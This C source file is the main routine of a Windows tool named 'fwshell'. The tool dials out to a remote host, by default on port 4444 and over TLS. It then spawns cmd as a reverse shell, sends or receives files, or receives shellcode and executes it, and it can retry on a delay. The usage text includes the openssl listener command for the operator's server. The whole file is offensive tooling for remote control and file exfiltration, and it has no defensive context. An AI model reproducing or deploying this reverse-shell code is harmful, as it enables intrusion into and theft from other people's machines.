#include "fwshell.h"

#define APP_NAME L"fwshell"
#define APP_VERSION L"0.1"

void
Usage()
{
    wprintf(L"Usage: %s [options] hostname [port (default: 4444)]\n", APP_NAME);
    wprintf(L" -r filename         Send a file.\n");
    wprintf(L" -w filename         Receive a file.\n");
    wprintf(L" -c command          Command to execute (default: cmd).\n");
    wprintf(L" -s                  Receive a shellcode and execute it.\n");
    wprintf(L" -E                  Turn off TLS encryption.\n");
    wprintf(L" -t delay            Retry every delay seconds.\n");
    wprintf(L"\n");
    wprintf(L"On the server :\n");
    wprintf(L"$ openssl s_server -quiet -no_ssl2 -no_ssl3 -key cert.pem -cert cert.pem -accept 4444\n");

    exit(0);
}

/*****************************************************************************/
/* Main.                                                                     */
/*****************************************************************************/

int
_tmain(int argc, _TCHAR *argv[])
{
    CONFIG Config;
    PCTX_TRANSPORT_INFO lpTransportInfo = NULL;

    wprintf(L"\n-=[ %s %s ]=-\n\n", APP_NAME, APP_VERSION);
    wprintf(L"[+] Current PID: %x (%d)\n\n", GetCurrentProcessId(),
        GetCurrentProcessId());

    /* Set default configuration. */
    ZeroMemory(&Config, sizeof(CONFIG));
    Config.dwDelay = 0;
    Config.useTLs = TRUE;
    Config.doReceiveFile = FALSE;
    Config.doSendFile = FALSE;
    Config.doShell = TRUE;
    Config.lpHostname = NULL;
    Config.lpFilename = NULL;
    Config.lpPort = L"4444";
    Config.lpCommandLine = NULL;
    Config.doShellcode = FALSE;

    /* Parsing command-line */
    if (ParseCommandLine(&Config, argc, argv) == FALSE)
        Usage();

    if (Config.lpHostname == NULL)
        Usage();

    if (Config.lpCommandLine == NULL)
    {
        Config.lpCommandLine = MALLOC(8);
        wcscpy_s(Config.lpCommandLine, 4, (const wchar_t *)L"cmd");

    }

    /* Connecting. */
    if (Config.useTLs)
    {
        if (TransportTlsInit(&lpTransportInfo, Config.lpHostname, Config.lpPort) == FALSE)
        {
            wprintf(L"[-] TransportTlsInit() failed.\n");
            return 255;
        }
    }
    else
    {
        if (TransportSocketInit(&lpTransportInfo, Config.lpHostname, Config.lpPort) == FALSE)
        {
            wprintf(L"[-] TransportSocketInit() failed.\n");
            return 255;
        }
    }

    while (1)
    {
        /* Connect to the remote host. */
        if (lpTransportInfo->Connect(lpTransportInfo) == FALSE)
        {
            wprintf(L"[-] Connection to `%s:%s` failed.\n", Config.lpHostname, Config.lpPort);
        }
        else
        {
            wprintf(L"[+] Connected to `%s:%s`.\n", Config.lpHostname, Config.lpPort);

            /* Action! */
            if (Config.doShell)
            {
                ShellExecuteChild(lpTransportInfo, Config.lpCommandLine);
            }
            else if (Config.doReceiveFile)
            {
                if (FileReceive(lpTransportInfo, Config.lpFilename) == 0)
                {
                    wprintf(L"[-] Could not receive `%s`.\n", Config.lpFilename);
                }
                else
                {
                    wprintf(L"[+] Received `%s`.\n", Config.lpFilename);
                }
            }
            else if (Config.doSendFile)
            {
                if (FileSend(lpTransportInfo, Config.lpFilename) == 0)
                {
                    wprintf(L"[-] Could not send `%s`.\n", Config.lpFilename);
                }
                else
                {
                    wprintf(L"[+] Sent `%s`.\n", Config.lpFilename);
                }
            }
            else if (Config.doShellcode)
            {
                ShellcodeReceiveExecute(lpTransportInfo);
            }
        }

        if (Config.dwDelay == 0)
            break;

        Sleep(Config.dwDelay * 1000);
    }

    /* Exiting. */
    wprintf(L"[+] Closing.\n");
    lpTransportInfo->Disconnect(lpTransportInfo);
    lpTransportInfo->Deinit(&lpTransportInfo);

    return 0;
}